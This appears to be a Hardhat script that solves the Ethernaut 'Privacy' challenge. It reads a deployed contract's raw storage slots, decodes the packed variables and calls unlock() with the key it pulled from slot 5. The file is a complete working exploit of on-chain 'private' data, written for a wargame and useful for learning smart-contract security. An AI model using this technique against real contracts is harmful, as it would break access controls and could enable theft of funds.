const { ethers } = require("hardhat");
const hre = require("hardhat");
const { boolean } = require("hardhat/internal/core/params/argumentTypes");


async function solve(instance_address, account) {

    const Privacy = await ethers.getContractFactory("Privacy");

    let contract = Privacy.attach(instance_address);

    storage0 = await ethers.provider.getStorageAt(instance_address, 0);
    storage1 = await ethers.provider.getStorageAt(instance_address, 1);
    storage2 = await ethers.provider.getStorageAt(instance_address, 2);
    storage3 = await ethers.provider.getStorageAt(instance_address, 3);
    storage4 = await ethers.provider.getStorageAt(instance_address, 4);
    storage5 = await ethers.provider.getStorageAt(instance_address, 5);

    let locked = storage0 == 1;
    console.log(`locked: ${locked}`);

    let id = parseInt(storage1);
    console.log(`id: ${id}`);

    let flattening = parseInt('0x' + storage2.slice(-2));
    console.log(`flattening: ${flattening}`);
    let denomination = parseInt('0x' + storage2.slice(-4, -2));
    console.log(`denomination: ${denomination}`);
    let awkwardness = parseInt('0x' + storage2.slice(-8, -4));
    console.log(`awkwardness: ${awkwardness}`);
    
    let data_3 = storage5;
    console.log(data_3);
    key = data_3.substring(0, 34);
    console.log(`key: ${key}`);

    console.log('Solving...');
    let tx = await contract.unlock(key);
    console.log('Waiting for 10 confirmations...');
    await tx.wait(10);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0xF58B193Fc9938a9C9F912Afd7E7BB2495d1d1fAc';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
